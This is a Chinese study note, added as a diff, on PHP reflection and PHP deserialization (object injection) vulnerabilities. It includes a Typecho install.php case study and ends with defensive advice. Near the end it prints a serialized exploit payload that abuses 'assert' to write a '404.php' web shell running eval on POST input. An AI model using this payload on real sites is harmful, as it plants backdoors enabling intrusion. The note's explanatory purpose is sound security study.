@@ -1,0 +1,50 @@
+https://www.php.net/manual/zh/book.reflection.php
+反射能够做什么?
+快速找到类,方法定义的相关信息
+三大反射类
+ReflectionFunction() 函数定义所在的的文件及起始位置
+ReflectionClass() 常量,属性,方法,命名空间,类是否是final或者abstract
+ReflectionMethod() 方法修饰类型,方法名,方法注释
+
+如何使用?
+举个小例子, 具体更多用法请看手册
+
+
+// 1. 实例化反射类
+$reflection = new ReflectionClass('className'); // 参数是类名(string)或者类的实例(object)
+
+// 2. 获取相关信息
+$className  = $reflection->getName();
+
+// 3. try...catch
+try{
+    $reflection = new ReflectionClass('className');
+} catch(Exception $e) {
+    var_dump($e->getMessage());
+}
+
+在平常开发中，用到反射的地方不多：一个是对对象进行调试，另一个是获取类的信息。在MVC和插件开发中，使用反射很常见，但是反射的消耗也很大，在可以找到替代方案的情况下，就不要滥用。
+
+很多时候，善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不应该暴露的方法或属性被强制暴露了出来，这既是优点也是缺点。
+
+
+序列化   将对象转换成字符串
+反序列化  将特定格式的字符串转换成对象
+什么是反序列化漏洞
+PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。
+一般程序在创建的时候，都会重写析构函数和构造函数，反序列化就是利用这些重写的函数。
+1、serialize()
+2、unserialize()
+
+Typecho反序列化漏洞
+Typecho：
+是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，目前使用SVN来做版本管理。
+Typecho漏洞：
+1、漏洞发生在网站根，install.php文件。
+2、找到网站的漏洞位置，使用了‘unserialize’函数去反序列化接受到的‘__typecho_config’参数。
+3、根据源代码追踪到构造函数并利用。
+Typecho利用
+a:2:{s:7:"adapter";O:12:"Typecho_Feed":4:{s:19:"Typecho_Feed_type";s:8:"ATOM 1.0";s:22:"Typecho_Feed_charset";s:5:"UTF-8";s:19:"Typecho_Feed_lang";s:2:"zh";s:20:"Typecho_Feed_items";a:1:{i:0;a:1:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:57:"file_put_contents(’404.php', '<?php @eval($_POST[i]);?>')";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}}}}s:6:"prefix";s:7:"typecho";}
+
+修复和防御
+和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以好的预防措施就是不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。
